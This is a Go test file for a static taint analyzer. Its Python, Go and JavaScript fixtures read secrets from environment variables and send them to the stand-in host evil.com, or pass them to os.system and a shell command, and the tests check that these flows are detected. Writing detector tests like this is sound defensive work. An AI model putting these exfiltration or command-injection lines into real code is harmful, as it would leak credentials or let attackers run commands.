package ir

import (
	"fmt"
	"testing"
)

func TestTaintAnalysisBasic(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("taint_test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Taint findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s at %s\n", f.Severity, f.Description, f.Location)
		fmt.Printf("    Source: %s (%s)\n", f.Source.VarName, f.Source.Category)
		fmt.Printf("    Sink: %s\n", f.Sink.Call.FuncName)
		fmt.Printf("    DataFlow:\n")
		for _, step := range f.DataFlow {
			fmt.Printf("      %s: %s → %s\n", step.Kind, step.VarName, step.Description)
		}
	}

	if len(findings) == 0 {
		t.Error("should detect taint flow from os.getenv to requests.post")
	}
}

func TestTaintAnalysisPropagation(t *testing.T) {
	code := `import os
import requests

def leak():
    key = os.getenv("SECRET")
    data = {"token": key}
    payload = format_data(data)
    requests.post("https://evil.com", json=payload)

def format_data(data):
    return data
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("propagation.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Propagation findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s\n", f.Description)
		if len(f.Source.PropagationPath) > 0 {
			fmt.Printf("    Path: %v\n", f.Source.PropagationPath)
		}
	}
}

func TestTaintAnalysisCommandExec(t *testing.T) {
	code := `import os

def run_command():
    cmd = os.getenv("COMMAND")
    os.system(cmd)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("cmd_taint.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Command exec taint findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
		fmt.Printf("    Source: %s → Sink: %s\n", f.Source.VarName, f.Sink.Call.FuncName)
	}

	if len(findings) == 0 {
		t.Error("should detect taint flow from os.getenv to os.system")
	}
}

func TestTaintAnalysisNoFalsePositive(t *testing.T) {
	code := `import os

def safe():
    name = "hello"
    print(name)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("safe.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Safe code findings: %d (expected 0)\n", len(findings))
	if len(findings) > 0 {
		t.Error("should not detect taint in safe code")
	}
}

func TestTaintAnalysisMultipleSinks(t *testing.T) {
	code := `import os
import requests
import subprocess

def multi_sink():
    secret = os.getenv("SECRET")
    requests.post("https://evil.com", data=secret)
    os.system("echo " + secret)
    with open("log.txt", "w") as f:
        f.write(secret)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("multi_sink.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Multi-sink findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s → %s\n", f.Severity, f.Source.VarName, f.Sink.Call.FuncName)
	}

	if len(findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d", len(findings))
	}
}

func TestTaintAnalysisGo(t *testing.T) {
	code := `package main

import (
	"net/http"
	"os"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := os.Getenv("CMD")
	exec.Command("sh", "-c", cmd).Run()
}
`

	parser, _ := GetParser("go")
	file, err := parser.Parse("handler.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Go taint findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
	}
}

func TestTaintAnalysisJavaScript(t *testing.T) {
	code := `const { exec } = require('child_process');
const axios = require('axios');

function attack() {
    const secret = process.env.API_KEY;
    axios.post('https://evil.com', { key: secret });
}
`

	parser, _ := GetParser("javascript")
	file, err := parser.Parse("attack.js", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("JavaScript taint findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
	}
}

func TestTaintRuleCustomization(t *testing.T) {
	// 测试自定义规则
	customRules := []TaintRule{
		{
			ID:          "source-custom",
			Kind:        TaintSource,
			Category:    "custom",
			Description: "自定义来源",
			Severity:    "高风险",
			MatchCall: CallMatchRule{
				FuncNamePattern: "get_secret",
				ArgIndex:        -1,
			},
		},
		{
			ID:          "sink-custom",
			Kind:        TaintSink,
			Category:    "custom",
			Description: "自定义汇聚",
			Severity:    "高风险",
			MatchCall: CallMatchRule{
				FuncNamePattern: "send_to",
				ArgIndex:        0,
			},
		},
	}

	code := `def attack():
    data = get_secret()
    send_to(data, "https://evil.com")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("custom.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(customRules)
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Custom rule findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s\n", f.Description)
	}
}

func TestTaintAnalysisWithCallGraph(t *testing.T) {
	code := `import os
import requests

def main():
    secret = get_secret()
    send_data(secret)

def get_secret():
    return os.getenv("API_KEY")

def send_data(data):
    requests.post("https://evil.com", json={"key": data})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("callgraph_taint.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 先构建调用图
	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	// 再做污点分析
	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("Call graph + taint findings: %d\n", len(findings))
	fmt.Printf("Call graph stats: %s\n", graph.Stats())

	for _, f := range findings {
		fmt.Printf("  - %s\n", f.Description)
		fmt.Printf("    Source: %s@%s\n", f.Source.VarName, f.Source.Location)
		fmt.Printf("    Sink: %s@%s\n", f.Sink.Call.FuncName, f.Sink.Location)
	}
}

func TestTaintNoSubstringFalsePositive(t *testing.T) {
	// secret 不应匹配 secretKey（子串误匹配修复）
	code := `import os
import requests

def test():
    secretKey = os.getenv("KEY")
    publicKey = os.getenv("PUB")
    requests.post("https://evil.com", data=publicKey)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("no_substr_fp.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	analyzer := NewTaintAnalyzer(DefaultTaintRules())
	findings := analyzer.Analyze([]File{*file})

	fmt.Printf("=== 子串误匹配测试 ===\n")
	fmt.Printf("Findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s → %s\n", f.Source.VarName, f.Sink.Call.FuncName)
	}

	// publicKey 应该被污染（os.getenv），secretKey 不应污染 publicKey
	// 只应有 1 条发现：publicKey → requests.post
	if len(findings) != 1 {
		t.Errorf("expected 1 finding (publicKey→requests.post), got %d", len(findings))
	}
	if len(findings) > 0 && findings[0].Source.VarName != "publicKey" {
		t.Errorf("expected source to be publicKey, got %s", findings[0].Source.VarName)
	}
}

func TestContainsVarRef(t *testing.T) {
	tests := []struct {
		text    string
		varName string
		want    bool
	}{
		{"secret", "secret", true},
		{"json={\"key\": secret}", "secret", true},
		{"secretKey", "secret", false},
		{"my_secret", "secret", false},
		{"secret_key", "secret", false},
		{"data = secret + 'suffix'", "secret", true},
		{"prefix_secret", "secret", false},
		{"secret", "secretKey", false},
		{"", "secret", false},
		{"secret", "", false},
	}

	for _, tt := range tests {
		got := containsVarRef(tt.text, tt.varName)
		if got != tt.want {
			t.Errorf("containsVarRef(%q, %q) = %v, want %v", tt.text, tt.varName, got, tt.want)
		}
	}
}
